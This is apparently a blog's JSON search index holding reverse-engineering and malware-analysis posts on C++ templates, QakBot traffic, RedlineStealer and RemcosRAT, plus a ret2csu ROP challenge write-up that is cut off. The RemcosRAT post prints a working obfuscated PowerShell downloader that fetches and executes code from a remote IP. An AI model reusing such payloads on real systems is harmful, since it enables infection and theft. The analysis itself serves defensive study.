[
  
  {
    "title": "Reversing C++ Basic Templates",
    "url": "/posts/basic-templates/",
    "categories": "opensecurity",
    "tags": "c++, reverse",
    "date": "2022-07-26 21:08:00 +0300",
    





    "snippet": "  In this exercise you will need to reverse engineer a binary, research different functions, and understand if the functions are part of a template or not.NB: Decompilers are not permitted, please use only static reverse engineering during this lab.The lab can be downloaded at the following link CalcNum labWhat is a C++ template?A Template is a c++ entity that accepts different data types but performs the same functionality. The data types are passed as template parameters to template function so that we don’t need to write same code functionality for different data types.Lab AnalysisFor solving the questions, I used an approach of first reading questions and then reverse engineering those functions only. This ensured I only reversed functions important to our analysis.Question 1  Which of the the following functions are part of the same template?For reverse engineering we will focus on the following functions, 0x1229, 0x1620, 0x1342, 0x15fa, and 0x1245 in order to answer the first and subsequent questions.The first step to manually reverse functions and understand what each function is doing.For analysis I will be using IDA Pro freeware.0x1229 Function AnalysisLooking at the function as shown in image above, it accepts two parameters of type int and does Subtraction (assembly instructionsub) of local variables x and y ant then returns the result. The return value is of type int, therefore we can set type of our function as shown in the image above.0x1620 Function AnalysisFrom the analysis of this function, it accepts two parameters of type long and finds the maximum value between the two. The two parameters are compared through use of jge assembly instruction as shown above.0x1342 Function AnalysisThe function accepts two parameters of type long and checks if one parameter is equal to zero. If the value is not equal to zero, it does math and bit operations.0x15fa Function AnalysisFrom the analysis of this function, function accepts two parameters of type int and finds the maximum value between the two. The two parameters are compared through use of jge assembly instruction. Therefore the maximum value is returned by the function.0x1245 Function AnalysisThis function takes four parameters of type int and does further bits operations as shown in the disassembly code.From the above functions analysis, only two functions qualify as templates. 0x1620 and 0x15fa are templates functions because they perform the same functionality( Finding the Maximum value) and number of parameters passed to each function are the same.Question 2  Review the function at address 0x12C5 and other functions in the binary. Is this function a template function?0x12C5 Function AnalysisThis function does the same functionality as the function 0x1245, but the difference is the unequal number of parameters passed to each function.Therefore, it does not qualify as a template function.Question 3  Review the function at address 0x15cc and the function at address 0x15fa. Are these functions part of the same template function?0x15cc Function AnalysisThis function is used for calculating minimum value of the two parameters passed to function.The two functions are not of the same template function. This is because one is used for calculating the maximum value and other one for minimum value. The difference between the two is jge and jle conditional assembly instructions as shown in IDA disassembly above.References  C++ Templates Basics - https://m.cplusplus.com/doc/oldtutorial/templates/"
  },
  
  {
    "title": "Gopackets Library",
    "url": "/posts/gopackets/",
    "categories": "coding",
    "tags": "wireshark, go",
    "date": "2022-04-20 21:08:00 +0300",
    





    "snippet": "This is an article of my adventures with golang gopacket library. As I was working on a personal project, I came across gopacket library which provides capabilities for decoding packets in Go. The capabilities provided by the library motivated me to try malware traffic analysis with the library instead of using Wireshark. This article focuses on analyzing the QKBOT malware traffic .What is gopacketGopacket is a library developed by google that provides capabilities for decoding packets in Go language, it enables one to decode the Layers structures of the packets, Network flows, create packets, e.t.c . Library can be used for various purposes ranging from:  Networking tools by Network Administrators  Offensive tooling by RED teams i.e Packet Sniffers  Defensive analysis capabilities by Blue Teams i.e IP monitoringThe ability to manually craft packets can enable one to test systems network connectivity( up or down),vulnerabilities on systems by replaying packets over network.Below are scenarios where gopacket can be used by different users.Defensive capabilitiesTo understand how gopacket can be used by defenders, we will analyze a packet of malware traffic from malware-traffic-analysis website.For this case I will use QBOT Pcap provided in April 2022.  Before starting analysis of malware of any software one needs to have a clear objective of what HE/She wants to achieve. Our goal can be analyzing malware for various key words, IP addresses or any other IOCs.1. keywords FilteringFirst we can write a simple program to analyze our packets using keywords which can be contained in the Application layer of the TCP Model of our packets.  The keywords can range from HTTP Methods, File extensions and Known domain names. The keywords can be “GET” http method, “.zip” or “.exe” to check the file names extensions.Example code of searching our packet using keyword values is shown below.package mainimport ( \"fmt\" \"strings\" \"github.com/google/gopacket\" \"github.com/google/gopacket/pcap\")//declare variable to hold our pcap filevar pcapFile string =\"cobalt-strike.pcap\"func main() {  //read the packet file handle, err := pcap.OpenOffline(pcapFile) var filter string  = \"tcp\" err = handle.SetBPFFilter(filter) if err != nil {  panic(err) } packetSource  := gopacket.NewPacketSource(handle, handle.LinkType()) for packet :=range packetSource.Packets() {  app := packet.ApplicationLayer()  if app != nil {   if strings.Contains(string(app.Payload()), \"zip\"){    fmt.Println(string(app.Payload()))   }  } }}For the above code we are doing Berkeley Filter of only TCP traffic.It is possible to filter both Stream type and PORT using BPF.The results from the code above are.From running the above code we are able to get file attachment name “iseerroaemtefspidnle.zip” which is part of the artifacts of the malware provided.The attachments files name are matched by the IOC providedTRAFFIC TO DOWNLOAD THE INITIAL ZIP ARCHIVE:- 208.91.198.131 port 443 - https://geobram.com/ist/iseerroaemtefspidnle- 208.91.198.131 port 443 - https://geobram.com/ist/NO_2950435796.zipThe “GET” method is used for getting an available resource, therefore meaning the zip file is downloaded to the victim’s machine.2. Packet Network Flowsgopacket enables one to follow the network flow in certain port or even stream. This enables one to track network activity of a given IP address. This is very useful when there is a spike of network activity in a given port or range of ports but source is not known.Example code used for Filtering the C2 traffic flow for a given port is as shown in the code snippet below.package mainimport ( \"fmt\" \"github.com/google/gopacket\" \"github.com/google/gopacket/layers\" \"github.com/google/gopacket/pcap\")//declare variable to hold our pcap filevar pcapFile string =\"cobalt-strike.pcap\"func main() {  //read the packet file handle, err := pcap.OpenOffline(pcapFile) var filter string  = \"tcp and port 65400\" err = handle.SetBPFFilter(filter) if err != nil {  panic(err) } packetSource  := gopacket.NewPacketSource(handle, handle.LinkType()) for packet :=range packetSource.Packets() {  tcp := packet.TransportLayer().(*layers.TCP)  if tcp != nil {   fmt.Println(packet.NetworkLayer().NetworkFlow())  } } return}Below is the results of filtering the captured pcap file at port 65400. For Filtering section can be any PORT or even can be left blank.From the above we can confirm the IP address of the above packet matches the one in the QABOT C2 traffic IOCs.Only one IP address is shown because it the only communicating in that PORT. It is also possible to filter the packet metadata and timestamp for each packet send across.QAKBOT C2 TRAFFIC:- 47.158.25.67 port 443 - attempted TCP connections- 45.46.53.140 port 2222 - HTTPS traffic- port 443 - www.openssl.org - connectivity check (not inherently malicious)- 23.111.114.52 port 65400 - TCP traffic- 75.99.168.194 port 443 - HTTPS trafficFrom above analysis, it is possible to write your own packet analysis tools and bundle them into third-party tools as plugins.Offensive capabilitiesGolang has a lot of potential in developing offensive cyber capabilities ranging from developing vulnerabilities scanners, shellcodes and encoders, proxies and fuzzing tools.For this section i will focus on use of gopacket to sniff for PORT or stream.This is the OpenLive function which is a wrapper to the pcapOpenLive. The function takes an argument of device, which is our interface. the interface can “eth0” for ethernet.Takes a maximum size to read which is defined by snaplen.if the device set by the user is not found, the functions sets its to default in which is the index 0.func OpenLive(device string, snaplen int32, promisc bool, timeout time.Duration) (handle *Handle, _ error) { var pro int if promisc {  pro = 1 } p, err := pcapOpenLive(device, int(snaplen), pro, timeoutMillis(timeout)) if err != nil {  return nil, err } p.timeout = timeout p.device = device ifc, err := net.InterfaceByName(device) if err != nil {  // The device wasn't found in the OS, but could be \"any\"  // Set index to 0  p.deviceIndex = 0 } else {  p.deviceIndex = ifc.Index } //---------continue source code-------------This is a simple implementation of to show on how to capture live packets in a given port and machine.package mainimport ( \"fmt\" \"github.com/google/gopacket\" \"github.com/google/gopacket/pcap\")var ( interface_point string =\"wlp4s0\" snaplen_time int32 = 1600 promiscuous bool = true)func main() { // Open an Interface to capture packets, with time in milliseconds handle, err := pcap.OpenLive(interface_point, snaplen_time, promiscuous, pcap.BlockForever) if err != nil {  panic(err) } var filter string  = \"tcp and port 3000\" err = handle.SetBPFFilter(filter) if err != nil {  panic(err) } packetSource := gopacket.NewPacketSource(handle, handle.LinkType()) for packet := range packetSource.Packets() {  //Print captured packets  fmt.Println(packet) }}NetworkingGolang has a lot of network packages which can be used from building tools from proxies, load balancers and scanners. This provides it an opportunity to build small utilities to help solve network issues.The FindAllDevs function enumerates all the interfaces on the current machine.Implementation of FindAllDevs in the pcap packagefunc FindAllDevs() (ifs []Interface, err error) { alldevsp, err := pcapFindAllDevs() if err != nil {  return nil, err } defer alldevsp.free() for alldevsp.next() {  var iface Interface  iface.Name = alldevsp.name()  iface.Description = alldevsp.description()  iface.Addresses = findalladdresses(alldevsp.addresses())  iface.Flags = alldevsp.flags()  ifs = append(ifs, iface) } return}From the implementation of the interface, we can parse Name, description, Addresses from the interface information of the Interface found.Below is a simple program which can be used as an replacement for ipconfig in ubuntu.package mainimport ( \"fmt\" \"log\" \"github.com/google/gopacket/pcap\")func main() { // Find all devices devices, err := pcap.FindAllDevs() if err != nil {  log.Fatal(err) } // Print device information fmt.Println(\"Devices found:\") for _, device := range devices {  fmt.Println(\"\\nName: \", device.Name)  fmt.Println(\"Description: \", device.Description)  for _, address := range device.Addresses {   fmt.Println(\"- IP address: \", address.IP)   fmt.Println(\"- Subnet mask: \", address.Netmask)  }}}To compile the above code, run the following bash commandgo build devices.go   //choose a suitable for you programAfter a Successful Build, you can add the program to your environment path. Running the program outputs the following output.ConclusionGolang net packages and gopacket library provides one ability to write network application ranging from small utilities to scanners.  Bundle the interface scanner with a network scanner to get all the interfaces exposed in a given network range.References  https://twitter.com/malware_traffic/status/1513556366346137605  Black Hat GO book (Go Programming for Hackers and pentesters) by Tom Steele, Chris Patten, and Dan Kottmann."
  },
  
  {
    "title": "RedlineStealer Information stealer malware analysis",
    "url": "/posts/readlinestealer/",
    "categories": "malware",
    "tags": "malware, redlinestealer",
    "date": "2022-02-07 21:08:00 +0300",
    





    "snippet": "Redline malware is an Information Stealer written in c#, targeting windows victims. It is used for gathering victims information ranging from the Browser cookies, saved credentials, Discord tokens, OS information, Languages, VPN profiles, Installed Programs and Network configurations.The malware is capable of downloading additional malware from its C2 servers.Stage1 - Loader AnalysisThe first stage of sample malware is used for assembling and executing an additional payload. The sample used throughout this post is RedlineStealer malware which can be downloaded from MalwareBaazar.The sha256 hash of the sample is 72b7f772e019def30abcf817ae7a3004a84215daef67588eaa1fde3839df2fa2. First step is loading sample in Detect it Easy tool to check whether is packed or not.From the initial Analysis, the sample is not packed and is a .NET Family malware. Vast amount of .NET family programming languages functionality has given malware authors power to write simple yet powerful tools therefore leading to an increase in malware distributed.Payload ExtractionFor Analysis of compiled binaries, IDA and ghidra are main first tools of choice to an analyst. For analysis of .NET binaries is different, use dnSpy which helps debug the functionality of the sample.For extraction of our payload, we will do both manual and dynamic extraction of the second stage binary. Both methods have their own advantages and disadvantages as highlighted below.Method1 - Manual ExtractionThis method is we extract payload from the encrypted string arrays s as shown in the image below. Malware uses anti-analysis techniques to prevent it from being analyzed.From image above, we de-obfuscate malware by replacing the strings with the target strings as shown in the program. After replacing all the strings,we write a small python program to convert the base64 encoded string to PE binary.The python script to decode the base64 encoded string to binary.import base64#s string array is our binarystring_encoded = \" \"decoded = base64.b64decode(string_encoded)open('stage2.exe', 'wb').write(decoded)Our dumped files are valid binaries, but do not contain all features because the malware is using Reflection method to load additional assembly code. Reflection is a method used to load other assemblies at runtime of the program. This enables the malware to add extra features and validation of the program.Method2 - Dynamic ExtractionThe second method Dynamic is more powerful compared to the manual method.This enables us to inspect the program behavior at runtime. For extraction of the second stage payload we put a breakpoint on the line 22 as shown in image below.On dnspy debugger put a breakpoint on line 22, Run the program until the execution hits the breakpoint.By examining the values in image above,we can examine the array we passing to the object method. Looking at the bytes data of the above array, the first two bytes are magic number of PE file 4D5A or ascii MZ. From the first two bytes we can make an assumption the buffer is our second stage binary. Right click the buffer memory to save the sample.Stage2 - Payload AnalysisThis is the second stage analysis of our extracted malware file, The extracted binary is .NET binary. Opening the binary in debugger, entrypoint of the binary looks as shown in the image below. The main function executes the WriteLine function.FMalware does environment check before communication to configured C2 servers.Language Culture checkThe malware checks the language, Timezone, CultureInfo and region country of the Victims Machine. The cultureInfo class provides information about a specific culture, known as locale. The information includes the formatting of the dates, writing system, numbers and calendar used.The malware check if victims region country is within the array of the strings shown above and if the does not contain EnglishName.Network Communication AnalysisThe second part of our analysis is determining IP address in which the malware is communicating to.The Ip address of the malware seems to be encrypted as shown in the image below. StringDecrypt function takes two arguments, the IP address and Key and decrypts the addressThe arguments variables of the malware are shown in the image below. The arguments includes the IP address and Key used for encryption of the data.With the encrypted IP and key we can decrypt the address used for providing the connection.IP address DecryptionThe StringDecrypt is a multistage decryption method which employs both base64 encoding and bitwise xor logic for decryption of the data.From the logic above, reimplement the logic in python and recover the encrypted data.The python code used for decrypting the code is,# -*- coding: utf-8 -*-import base64import pwnip_addr =b\"AiE1CyQDBVA/JR4OPwIKGSoZGkU6NyVa\"key =b\"Outshines\"ip_addr_decode = base64.b64decode(ip_addr)result_encoded =pwn.xor(ip_addr_decode, key)result = base64.b64decode(result_encoded)print(result)Running above code we get C2 server address $ python3 base.pyb'101.99.93.70:54437'Strings Conciliation methodsThe malware employs strings concilation methods to slow down analysis. It adds some junk strings to the target strings which is replaced during the runtime of the malware with an empty string.Example of string concilation tactic is above function. The junk string added to the string array is MANGO which is replaced with an empty string.The string from the char array is coMANGOokies.sqMANGOlite , replacing the MANGO string with an empty string, we get cookies.sqlite which is a file used for storing cookies by Firefox browser.Information HarvestingThe Malware harvest a lot of Victims data and sends back to the configured c2 server. The malware is simple but effective in collecting a lot of user information. The information collected by malware includes cookies, user tokens, system configurations, graphic cards, processor count, Network information, application installed, credit wallet information and many more.Below is explanation of the capabilities of the malware.BrowserThe malware is capable of stealing the user`s credentials and cookies of from browser session.The malware is also capable of enumerating chrome and Opera Mini if installed on the Victim`s machine. It also gets the version of the installed browser as shown in the image below.FileZillaFilezilla is a professional software that makes transfer of files from one computer to another easier via FTP, SFTP, FTPs protocols and other cloud services such as Amazon S3.The malware scans for the saved credentials used by Victim in transferring files to other machines. The malware collects host, Port, User, Pass of the machinesPrograms EnumerationMalware is also capable of collecting all installed applications on the machine using ListofPrograms function as shown in the below. After enumerating all the installed applications, the malware sends data back to the C2 server.The malware enumerates installed application through use of registry. Querying of registry is an effective way of finding out all installed applications in Windows. The malware gets the program name and version as shown by text and text2 strings.VPN information GatheringThe malware scans for Victim`s configuration files and profiles of various VPNs installed on the device. The malware scans File configs NordVPN, OpenVpn configs and ProtonVPN profiles.ExfilitrationFor the exfiltration of the data, the malware creates a folder in APPdata folder called Yandex\\YAddon. The data collected is uploaded in chunks to c2 server.References  https://www.natlawreview.com/article/privacy-tip-315-redline-malware-used-to-steal-saved-credentials  https://www.zdnet.com/article/fortinet-warns-of-cybercriminals-using-omicron-variant-news-to-distribute-redline-stealer  https://www.proofpoint.com/us/blog/threat-insight/new-redline-stealer-distributed-using-coronavirus-themed-email-campaign"
  },
  
  {
    "title": "RemcosRat Excel Macro Analysis",
    "url": "/posts/remcosrat/",
    "categories": "malware",
    "tags": "remcosrat, malware",
    "date": "2022-01-25 21:08:00 +0300",
    





    "snippet": "RemcosRAT is a Fileless multi-stage malware that is distributed through malicious macros in Excel files. The malware enables remote administration of infected systems to perform unintended actions. This is a simple guide on understanding RemcosRat infection chain. The RemcosRAT infection chain can be described as shown by image @Unit 42.The infection chain start through phishing of the targets through mail services and the final payload of the infection chain is the used for communicating through TCP port 10174 as shown in the image.The samples and IOC can be downloaded from malware-traffic-analysis website RemcosRat sample.Pcap AnalysisBrad has provided infection traffic pcap of the malware samples in his website.Image above shows a Filter of http traffic in wireshark used for downloading further executables into infected machine.The malware gets additional samples using GET method as highlighted.From the tweet provided by unit42intel, the above link of the onedrive downloads a VBS file. The vbs file is not available in the onedrive at the time of writting but it is provided in malware-traffic-analysis website.&lt;html&gt;  &lt;head&gt;    &lt;title&gt;Object moved&lt;/title&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;h2&gt;      Object moved to      &lt;a        href=\"https://onedrive.live.com/download?cid=64F8294A00286885&amp;amp;resid=64F8294A00286885%21770&amp;amp;authkey=ABI3zrc6BsVUKxU\"        &gt;here&lt;/a      &gt;.    &lt;/h2&gt;  &lt;/body&gt;&lt;/html&gt;Verify the sha256 hash of the misc.vbs matches the one provided in IOCs of Remcos Rat.@remcosrat$ shasum -a 256 misc.vbs95c0a9e6463a2eb1bbfe3198cd4b6cd74927a209ca4ab17501c2f444494f4499  misc.vbsStage2 - Downloader (atcn.jpg)Right click the GET /atcn.jpg url in wireshark and follow the http stream. The HTTP streams of the urls accessed by the malware as shown below.Malware is executing a powershell script which is obsfuscated. For further analysis we can export all the http objects. To export http objects, click File -&gt; Export Objects -&gt; HTTP in wireshark. select saveall to download all the http objects in malware connection traffic.The downloaded files as are not images as the extensions suuggests to. They are ASCCII text files.$ file atcn.jpgatcn.jpg: ASCII text, with very long lines (4130), with CRLF line terminators$ file calient.jpgcalient.jpg: ASCII text, with very long lines (65536), with no line terminatorsBelow is the obfuscated powershell script.&lt;xsl:stylesheet version=\"1.0\"      xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"      xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\"      xmlns:user=\"http://mycompany.com/mynamespace\"&gt; &lt;msxsl:script language=\"JScript\" implements-prefix=\"user\"&gt;&lt;![CDATA[var r = new ActiveXObject(x0asd44(\"5368656c6c2e4170706c69636174696f6e\"))var yy=r.ShellExecute(\"powershell.exe\",x0asd44(\"202444436F626356456D76694A72416B484D595547573D273237253542253736253646253639253634253237253230253242253230253237253544253230253542253533253739253733253734253237253230253242253230253237253635253644253245253532253635253636253643253635253237253230253242253230253237253633253734253639253646253645253245253431253733253733253635253237253230253242253230253237253644253632253643253739253544253341253341253443253646253631253634253537253639253237253230253242253230253237253734253638253530253631253732253734253639253631253643253445253631253644253635253238253237253237253444253639253633253732253646253733253646253636253734253245253536253639253733253735253631253643253432253631253733253639253633253237253237253239253237253743253439253435253538253342253234253734253335253336253636253637253230253344253230253542253435253645253735253644253544253341253341253534253646253446253632253641253635253633253734253238253542253533253739253733253734253635253644253245253445253635253734253245253533253635253633253735253732253639253734253739253530253732253646253734253646253633253646253643253534253739253730253635253544253243253230253333253330253337253332253239253342253542253533253739253733253734253635253644253245253445253635253734253245253533253635253732253736253639253633253635253530253646253639253645253734253444253631253645253631253637253635253732253544253341253341253533253635253633253735253732253639253734253739253530253732253646253734253646253633253646253643253230253344253230253234253734253335253336253636253637253342253634253646253230253742253234253730253639253645253637253230253344253230253734253635253733253734253244253633253646253645253645253635253633253734253639253646253645253230253244253633253646253644253730253230253637253646253646253637253643253635253245253633253646253644253230253244253633253646253735253645253734253230253331253230253244253531253735253639253635253734253744253230253735253645253734253639253643253230253238253234253730253639253645253637253239253342253234253734253734253739253344253237253238253445253635253737253244253237253242253237253446253632253641253635253237253242253237253633253734253230253445253635253237253242253237253734253245253537253635253237253242253237253632253433253643253639253237253242253237253635253645253734253239253237253743253439253630253435253630253538253342253234253644253736253344253230253542253444253639253633253732253646253733253646253636253734253245253536253639253733253735253631253643253432253631253733253639253633253245253439253645253734253635253732253631253633253734253639253646253645253544253341253341253433253631253643253643253432253739253645253631253644253635253238253234253734253734253739253243253237253434253646253737253645253643253646253631253634253533253734253732253639253645253637253237253243253542253444253639253633253732253646253733253646253636253734253245253536253639253733253735253631253643253432253631253733253639253633253245253433253631253643253643253534253739253730253635253544253341253341253444253635253734253638253646253634253243253237253638253734253734253730253237253230253242253230253237253341253246253246253331253330253334253245253332253332253333253245253331253331253339253245253331253336253337253246253633253631253643253639253635253645253734253245253641253730253637253237253239253342253234253732253337253338253636253634253330253330253330253733253634253344253230253234253644253736253230253244253733253730253643253639253734253230253237253235253237253230253743253436253646253732253435253631253633253638253244253446253632253641253635253633253734253230253742253542253633253638253631253732253544253542253632253739253734253635253544253232253330253738253234253546253232253744253342253234253739253335253641253638253336253332253634253636253330253344253230253439253630253435253630253538253238253234253732253337253338253636253634253330253330253330253733253634253230253244253641253646253639253645253230253237253237253239273B246A6D3D2444436F626356456D76694A72416B484D595547572E53706C69742827252729207C20666F7245616368207B5B636861725D285B636F6E766572745D3A3A746F696E74313628245F2C313629297D3B496045605828246A6D202D6A6F696E20272729\"),\"\",\"\",0);function x0asd44(hex) {    var str = '';    for (var i = 0; i &lt; hex.length; i += 2) str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));    return str;}]]&gt; &lt;/msxsl:script&gt;&lt;/xsl:stylesheet&gt;First decode the string we are passing to ActiveXObject function.function x0asd44(hex) {  var str = \"\";  for (var i = 0; i &lt; hex.length; i += 2)    str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));  return str;}console.log(x0asd44(\"5368656c6c2e4170706c69636174696f6e\"));Executing the above javascript code, our hexstring string parameter is decoded to Shell.Application.Below is the deobfuscated powershell script which is passed shell.Application as shown in the obsfucated script.'[void] [System.Reflection.Assembly]::LoadWithPartialName(''Microsoft.VisualBasic'')'|IEX;$t56fg = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072);[System.Net.ServicePointManager]::SecurityProtocol = $t56fg;do {$ping = test-connection -comp google.com -count 1 -Quiet} until ($ping);$tty='(New-Object Net.WebClient)'|I`E`X;$mv= [Microsoft.VisualBasic.Interaction]::CallByname($tty,'DownloadString',[Microsoft.VisualBasic.CallType]::Method,'http://104.223.119.167/calient.jpg');$r78fd000sd= $mv -split '%' |ForEach-Object {[char][byte]\"0x$_\"};$y5jh62df0= I`E`X($r78fd000sd -join '')The deobfuscated powershell script above downloads another string at the domain highlighted above. The malware gets obsfuscated strings of the calient.jpg url.Stage3 - Downloader (calient.jpg)Stage two downloads third obfuscated script strings in calient.jpg url. String is obfuscated and is larger than second stage atcn.jpg string. Looking at the obfuscated strings we have an interesting string referenced by ftIXfysfU variable.$y='[System.AppDomain]'|W0B4J;$g55=$y.GetMethod(\"get_CurrentDomain\") [String]$ftIXfysfU='4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C010300AF89D1610000000000000000E00002210B010800004402000048The string above seems to be an executable. This is because of the header file magic of PE executable. The magic number 4D5A or ASCII characters MZ represents the beginning of the file signature of Microsoft PE file.The python script belows decoded the bytes and returs an PE executable.#convert bytearray to PEremcosPE=bytearray(bytes.fromhex('4D5A90000300000004000000FFFc....'))with open('open.exe', 'wb') as filepe:    filepe.write(remcosPE)Now we have a fully RemcosRat malware, which is a .NET family malware.remcosrat$ file open.exeopen.exe: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS WindowsNext step is analyzing dropped PE file.References  https://www.malware-traffic-analysis.net/2022/01/04/index.html  https://twitter.com/Unit42_Intel/status/1478744612516900868/"
  },
  
  {
    "title": "Ropemporium Ret2csu challenge",
    "url": "/posts/ropemporium-ret2csu/",
    "categories": "ropemporium",
    "tags": "ctf, ropemporium",
    "date": "2021-12-20 21:08:00 +0300",
    





    "snippet": "We’re back in ret2win territory, but this time with no useful gadgets.How will we populate critical registers without them?The goal of this level is understanding of universal rop techniques due to limited gadgets available in the binary as compared to the ret2win challenge. The binary can be downloaded from authors website RopemporiumAfter downloading the binary, check enabled protections and mitigation’s. Only NX and Partial RELRO protections are turned on as shown below.    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)First is finding the vulnerability in the binary that will enable us to subvert program execution control flow. From the disassembly of main function we are only calling pwnme function.(gdb) disas mainDump of assembler code for function main:   0x0000000000400607 &lt;+0&gt;:\tpush   rbp   0x0000000000400608 &lt;+1&gt;:\tmov    rbp,rsp   0x000000000040060b &lt;+4&gt;:\tcall   0x400500 &lt;pwnme@plt&gt;   0x0000000000400610 &lt;+9&gt;:\tmov    eax,0x0   0x0000000000400615 &lt;+14&gt;:\tpop    rbp   0x0000000000400616 &lt;+15&gt;:\tretEnd of assembler dump.The function reference the got table in order to load the actual address of pwnme function from libret2csu.so library after the first call.pwnme Function Disassembly(gdb) disas pwnmeDump of assembler code for function pwnme:  0x000000000000093a &lt;+0&gt;:\tpush   rbp  0x000000000000093b &lt;+1&gt;:\tmov    rbp,rsp  0x000000000000093e &lt;+4&gt;:\tsub    rsp,0x20  0x0000000000000942 &lt;+8&gt;:\tmov    rax,QWORD PTR [rip+0x201697]        # 0x201fe0  0x0000000000000949 &lt;+15&gt;:\tmov    rax,QWORD PTR [rax]  0x000000000000094c &lt;+18&gt;:\tmov    ecx,0x0  0x0000000000000951 &lt;+23&gt;:\tmov    edx,0x2  0x0000000000000956 &lt;+28&gt;:\tmov    esi,0x0  0x000000000000095b &lt;+33&gt;:\tmov    rdi,rax  0x000000000000095e &lt;+36&gt;:\tcall   0x820 &lt;setvbuf@plt&gt;  0x0000000000000963 &lt;+41&gt;:\tlea    rdi,[rip+0x31e]        # 0xc88  0x000000000000096a &lt;+48&gt;:\tcall   0x7a0 &lt;puts@plt&gt;  0x000000000000096f &lt;+53&gt;:\tlea    rdi,[rip+0x32a]        # 0xca0  0x0000000000000976 &lt;+60&gt;:\tcall   0x7a0 &lt;puts@plt&gt;  0x000000000000097b &lt;+65&gt;:\tlea    rax,[rbp-0x20]  0x000000000000097f &lt;+69&gt;:\tmov    edx,0x20  0x0000000000000984 &lt;+74&gt;:\tmov    esi,0x0  0x0000000000000989 &lt;+79&gt;:\tmov    rdi,rax  0x000000000000098c &lt;+82&gt;:\tcall   0x7d0 &lt;memset@plt&gt;  0x0000000000000991 &lt;+87&gt;:\tlea    rdi,[rip+0x310]        # 0xca8  0x0000000000000998 &lt;+94&gt;:\tcall   0x7a0 &lt;puts@plt&gt;  0x000000000000099d &lt;+99&gt;:\tlea    rdi,[rip+0x36e]        # 0xd12  0x00000000000009a4 &lt;+106&gt;:\tmov    eax,0x0  0x00000000000009a9 &lt;+111&gt;:\tcall   0x7c0 &lt;printf@plt&gt;  0x00000000000009ae &lt;+116&gt;:\tlea    rax,[rbp-0x20]  0x00000000000009b2 &lt;+120&gt;:\tmov    edx,0x200  0x00000000000009b7 &lt;+125&gt;:\tmov    rsi,rax  0x00000000000009ba &lt;+128&gt;:\tmov    edi,0x0  0x00000000000009bf &lt;+133&gt;:\tcall   0x7f0 &lt;read@plt&gt;  0x00000000000009c4 &lt;+138&gt;:\tlea    rdi,[rip+0x34a]        # 0xd15  0x00000000000009cb &lt;+145&gt;:\tcall   0x7a0 &lt;puts@plt&gt;  0x00000000000009d0 &lt;+150&gt;:\tnop  0x00000000000009d1 &lt;+151&gt;:\tleave  0x00000000000009d2 &lt;+152&gt;:\tretEnd of assembler dump.(gdb)From the above disassembled code, we are reading more than the allocated buffer from the standard input, therefore leading to stack buffer overflow and corrupting the adjacent memory region. The program allocates a stack of fixed size 32bytes and reading 0x200 from the standard input file descriptor, which is more than the buffer size.The c equivalent of the above vulnerability is,read(0, *(rbp-0x20), 0x200) #reading 0x200 from the stdinFor exploitation purpose, goal is to control the return address of pwnme function and redirect execution to our desired address. In order to control the return address we need to fill the buffer with enough data and overflow the saved base pointer.From the stack image layout above, we need 32 bytes to fill the buffer, 8 bytes to overwrite the saved base pointer and 8 bytes to control return address. Because the NX execution is enabled on the binary, we can`t use the shellcode techniques, therefore we use other methods such a ropping.libc_csu_init DisassemblyBelow is the disassembled code for __libc_csu_init section for the ret2csu binary using objdump tool.objdump is a linux command line tool used for disassembling binaries.0000000000400640 &lt;__libc_csu_init&gt;:  400640:\t41 57                \tpush   r15  400642:\t41 56                \tpush   r14  400644:\t49 89 d7             \tmov    r15,rdx  400647:\t41 55                \tpush   r13  400649:\t41 54                \tpush   r12  40064b:\t4c 8d 25 9e 07 20 00 \tlea    r12,[rip+0x20079e]        # 600df0 &lt;__frame_dummy_init_array_entry&gt;  400652:\t55                   \tpush   rbp  400653:\t48 8d 2d 9e 07 20 00 \tlea    rbp,[rip+0x20079e]        # 600df8 &lt;__do_global_dtors_aux_fini_array_entry&gt;  40065a:\t53                   \tpush   rbx  40065b:\t41 89 fd             \tmov    r13d,edi  40065e:\t49 89 f6             \tmov    r14,rsi  400661:\t4c 29 e5             \tsub    rbp,r12  400664:\t48 83 ec 08          \tsub    rsp,0x8  400668:\t48 c1 fd 03          \tsar    rbp,0x3  40066c:\te8 5f fe ff ff       \tcall   4004d0 &lt;_init&gt;  400671:\t48 85 ed             \ttest   rbp,rbp  400674:\t74 20                \tje     400696 &lt;__libc_csu_init+0x56&gt;  400676:\t31 db                \txor    ebx,ebx  400678:\t0f 1f 84 00 00 00 00 \tnop    DWORD PTR [rax+rax*1+0x0]  40067f:\t00  400680:\t4c 89 fa             \tmov    rdx,r15  400683:\t4c 89 f6             \tmov    rsi,r14  400686:\t44 89 ef             \tmov    edi,r13d  400689:\t41 ff 14 dc          \tcall   QWORD PTR [r12+rbx*8]  40068d:\t48 83 c3 01          \tadd    rbx,0x1  400691:\t48 39 dd             \tcmp    rbp,rbx  400694:\t75 ea                \tjne    400680 &lt;__libc_csu_init+0x40&gt;  400696:\t48 83 c4 08          \tadd    rsp,0x8  40069a:\t5b                   \tpop    rbx  40069b:\t5d                   \tpop    rbp  40069c:\t41 5c                \tpop    r12  40069e:\t41 5d                \tpop    r13  4006a0:\t41 5e                \tpop    r14  4006a2:\t41 5f                \tpop    r15  4006a4:\tc3                   \tret  4006a5:\t90                   \tnop  4006a6:\t66 2e 0f 1f 84 00 00 \tcs nop WORD PTR [rax+rax*1+0x0]  4006ad:\t00 00 0000000000004006b0 &lt;__libc_csu_fini&gt;:  4006b0:\tf3 c3                \trepz ret zThe __libc_csu_init section contains a sequence of pop, ret instructions which makes it a good attack vector for our rop chain. The gadgets present in this section enables us to control RBX, RBP, R12, R13, R14, and R15 registers. From the ret-to-csu referenced paper this makes it a perfect candidate for our first stage and second stage rop chain.The first stage gadget is shown in disassembled code below. This enables us to control the registers with the values we want, which makes our second stage gadget more controllable.  40069a:\t5b                   \tpop    rbx  40069b:\t5d                   \tpop    rbp  40069c:\t41 5c                \tpop    r12  40069e:\t41 